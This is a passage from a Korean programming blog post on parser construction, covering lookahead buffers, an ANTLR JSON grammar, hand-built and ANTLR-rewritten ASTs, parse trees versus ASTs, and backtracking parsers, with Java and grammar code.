<p>를 하면 자연스럽게 가장 오래된 것을 버리고, 새로운 토큰을 맨 뒤에 넣고, base pointer 는 circular buffer 의 처음을 가리키게 된다.</p>

<pre><code>LT(i) { return lookahead[bp + i - 1]; }
</code></pre>

<p>하면 1 번째, 2 번째 등등의 lookahead 를 할 수 있게 된다.</p>

<pre><code>"To visualize parsing decisions, imagine a maze with a single entrance and a
single exit that has words written on the floor. Every sequence of words along
a path from entrance to exit represents a sentence. The structure of the maze
is analogous to the rules in a grammar that define a language. To test a sentence
for membership in a language, we compare the sentence's words with
the words along the floor as we traverse the maze. If we can get to the exit by
following the sentence's words, that sentence is valid."
</code></pre>

<h3>JSON Grammar</h3>

<p>예제삼아 JSON 을 ANTLR 그래머로 기술해본다.</p>

<pre><code>object
    : '{' pair (',' pair)* '}'
    | '{' '}'
    ;

array
    : '[' value (',' value)* ']'
    | '[' ']'
    ;

value
    : STRING
    | NUMBER
    | object
    | array
    | 'true'
    | 'false'
    | 'null'
    ;
</code></pre>

<h3>Building AST</h3>

<p>ANTLR 를 사용하지 않고, 손으로 AST 를 만들어보았다.</p>

<p>AST 는 Homogeneous AST / Normalized Heterogeneous AST / Irregular Heterogeneous AST 정도로
나눌 수 있는데, 간단한 Homogeneous AST 를 만들어 보았다.</p>

<p>Recursive 하게 decent 하는 파서의 특성을 활용하면, <code>AST.addChild(parent, int astType, Token token)</code>
정도의 콜을 적절히 달아주는 것으로 트리 빌딩이 가능하다.</p>

<pre><code>public class AST {
    Token token;
    List&lt;AST&gt; children;
    public AST(Token token) { this.token = token; }
    public void addChild(AST t) { 
        if (children == null) children = new ArrayList&lt;AST&gt;();
        children.add(t);
    }
}
</code></pre>

<p>일단 하나의 클래스로 모든 노드를 담는다.
하나의 타입만 있으니까, children 을 <code>List&lt;AST&gt; children</code> 으로 관리할 수 있다.
AST 를 만들기 위해, 3 lookaheads 를 사용하였다.</p>

<pre><code>$ java Test '[1,x=2,[3,4]]'
match LBRACK
match NAME
match COMMA
match NAME
match EQUALS
match NAME
match COMMA
match LBRACK
match NAME
match COMMA
match NAME
match RBRACK
match RBRACK
AST Type: AST_ROOT
    AST Type: AST_LIST
        AST Type: AST_NAME
            Token: NAME : 1
        AST Type: AST_ASSIGN
            AST Type: AST_IDENTIFIER
                Token: NAME : x
            AST Type: AST_VALUE
                Token: NAME : 2
        AST Type: AST_LIST
            AST Type: AST_NAME
                Token: NAME : 3
            AST Type: AST_NAME
                Token: NAME : 4
</code></pre>

<h3>Building AST with ANTLR</h3>

<p>벡터 계산에 관한 문법을 만들고, ANTLR 를 가지고 AST 를 build 한다.</p>

<pre><code>x = 1+2
y = 1*2+3
z = [1,2] + [3,4]
a = [1,2] . [3,4]
b = 3 * [1,2]
print x+2

statline : stat+ ;
stat: ID '=' expr | 'print' expr ;
expr: multExpr ('+' multExpr)* ; // E.g., "3*4 + 9"
multExpr: primary (('*'|'.') primary)* ;
primary : INT | ID | '[' expr (',' expr)* ']'
</code></pre>

<p>우선 <code>output=AST;</code> 로 AST 를 빌드 모드로.</p>

<pre><code>grammar VecMathAST;
options {output=AST;}
tokens {VEC;}
</code></pre>

<p>그리고 기존 문법에 AST rewrite 를 위한 규칙을 추가한다. 예를 들어</p>

<pre><code>statlist : stat+ ;
stat: ID '=' expr
</code></pre>

<p>같은 경우 <code>stat: ID '=' expr</code> 에 AST rewrite 규칙을 추가한다.</p>

<pre><code>statlist : stat+ ;
stat: ID '=' expr -&gt; ^('=' ID expr)
</code></pre>

<p><code>^('=' ID expr)</code> 은, <code>'='</code> 가 subtree 의 root 고, <code>ID</code>, <code>expr</code> 가 children 으로,
AST 를 구성하라는 rewriting rule 이 된다.</p>

<p>Antlr 의 AST rewriting 을 이해하기 위해 참조한 블로그는 <a href="http://bkiers.blogspot.kr/2011/03/5-building-ast.html">Bart&rsquo;s Blog</a> 임.</p>

<pre><code>bar : A B C D -&gt; ^(B A C) ;
</code></pre>

<p>을 하면, B 가 root 가 되고, A, C 가 children 이 되고, D 는 없어진다.</p>

<p>다른 예.</p>

<pre><code>addExpr : multiplyExpr (('+' | '-') multiplyExpr)* ;

addExpr : multiplyExpr (('+' | '-')^ multiplyExpr)* ;
</code></pre>

<p>을 하면, &lsquo;+&rsquo;, &lsquo;-&rsquo; 가 root 가 되고 multiplyExpr 2 개가 children 이 된다.</p>

<p>root 로 할만한 적당한 녀석이 없을 경우에는 하나 만들면 된다.</p>

<pre><code>block : (statement | funcitonDecl)* (Return expression ';')? ;

block : 
    (statement | functionDecl)* (Return expression ';')?
        -&gt; ^(BLOCK ^(STATEMENTS statement*) ^(RETURN expression?))
    ;
</code></pre>

<p>을 하면, 모든 block 은 STATEMENTS, RETURN 이라는 2 개의 children 을 가지게 된다.</p>

<p>본격적으로 AST rewriting rule 을 추가하면,</p>

<pre><code>// START: header
grammar VecMathAST;
options {output=AST;} // we want to create ASTs
tokens {VEC;} // define imaginary token for vector literal
// END: header

// START: stat
statlist : stat+ ;                    // builds list of stat trees
stat: ID '=' expr  -&gt; ^('=' ID expr)  // '=' is operator subtree root
    | 'print' expr -&gt; ^('print' expr) // 'print' is subtree root
    ;
// END: stat

// START: expr
expr:   multExpr ('+'^ multExpr)* ;        // '+' is root node
multExpr: primary (('*'^|'.'^) primary)* ; // '*', '.' are roots
primary
    :   INT   // automatically create AST node from INT's text
    |   ID    // automatically create AST node from ID's text
    |   '[' expr (',' expr)* ']' -&gt; ^(VEC expr+)
    ;
// END: expr

ID  :   'a'..'z'+ ;
INT :   '0'..'9'+ ;
WS  :   (' '|'\r'|'\n')+ {skip();} ;
</code></pre>

<h3>Parse Tree</h3>

<p>AST 와 Parse Tree 의 차이점이 <a href="http://stackoverflow.com/questions/5026517/whats-the-difference-between-parse-tree-and-ast">What&rsquo;s the difference between parse tree and AST?</a> 에 정리되어 있다.</p>

<pre><code>The AST only contains all 'useful' elements that will be used for further processing,
while the parse tree contains all the artifacts (spaces, brackets, ...)
from the original document you parse
</code></pre>

<h3>Backtracking Parser &amp; Memoizing Parser</h3>

<p>LL(k) 파서로 판단하기 어려운 모호성이 존재할 때, 쓰는 기법.</p>

<pre><code>The easiest way to implement a backtracking strategy for a parsing
decision is to speculatively attempt the alternatives in order until we
find one that matches. Upon success, the parser rewinds the input and 
parses the alternative normally. Upon failing to match an alternative,
the parser rewinds the input and tries the next one. If the parser can't 
find any matching alternative, it throws a "no viable alternative" 
exception.
</code></pre>

<p>다음과 같은 문법을 보자. Python 과 같이 <code>[a,b] = [c,d]</code> 와 같은 리스트 어사인을 지원하는 문법이다.</p>

<pre><code>stat    : list EOF | assign EOF ;
assign  : list '=' list ;
list    : '[' elements ']' ;
elements    : element (',' element)* ;
element     : NAME '=' NAME | NAME | list
</code></pre>

<p>stat 의 경우, list 인지 assign 인지 정하기 위해서는 리스트를 파싱하고 나서, 토큰 하나를 더 봐야
알 수 있다.</p>

<p>얼터너티브를 시도해보면서, 경우에 따라 백트래킹하는 코드.</p>

<pre><code>public void statement() throws RecognitionException {
    if ( speculate_stat_alt1() ) { list(); match(Lexer.EOF_TYPE); }
    else if ( speculate_stat_alt2() ) { assign(); match(Lexer.EOF_TYPE); }
    else throw new NoViableAltException("expecting stat found " + LT(1));
}

public boolean speculate_stat_al1() {
    boolean success = true;
    mark();
    try { list(); match(Lexer.EOF_TYPE); }
    catch (RecognitionException e) { success = false; }
    release();
    return success;
}
public boolean speculate_stat_al2() {
    boolean success = true;
    mark();
    try { assign(); match(Lexer.EOF_TYPE); }
    catch (RecognitionException e) { success = false; }
    release();
    return success;
}
</code></pre>
</div>
  
  


    </article>
  
  <div class="pagination">
    
      <a class="prev" href="/posts/21">&larr; Older</a>
    
    <a href="/blog/archives">Blog Archives</a>
    
    <a class="next" href="/posts/19">Newer &rarr;</a>
    
  </div>
</div>
<aside class="sidebar">
  
    <section>
  <h1>Recent Posts</h1>
  <ul id="recent_posts">
    
      <li class="post">
        <a href="/blog/2016/06/13/cve-2016-2468/">CVE-2016-2468</a>
      </li>
    
      <li class="post">
        <a href="/blog/2016/05/03/security-analysis-of-emerging-smart-home-applications/">Security Analysis of Emerging Smart Home Applications</a>
      </li>
    
      <li class="post">
        <a href="/blog/2016/04/26/rsa-sample-number/">RSA Sample Number</a>
      </li>
    
      <li class="post">
        <a href="/blog/2016/03/25/bleichenbacher/">Bleichenbacher</a>
      </li>
    
      <li class="post">
        <a href="/blog/2016/03/03/the-drown-attack/">The DROWN Attack</a>
      </li>
    
  </ul>
</section>





  
</aside>

    </div>
  </div>
  <footer role="contentinfo"><p>
  Copyright &copy; 2016 - KC -
  <span class="credit">Powered by <a href="http://octopress.org">Octopress</a></span>
</p>

</footer>
  







  <script type="text/javascript">
    (function(){
      var twitterWidgets = document.createElement('script');
      twitterWidgets.type = 'text/javascript';
      twitterWidgets.async = true;
      twitterWidgets.src = '//platform.twitter.com/widgets.js';
      document.getElementsByTagName('head')[0].appendChild(twitterWidgets);
    })();
  </script>





</body>
</html>
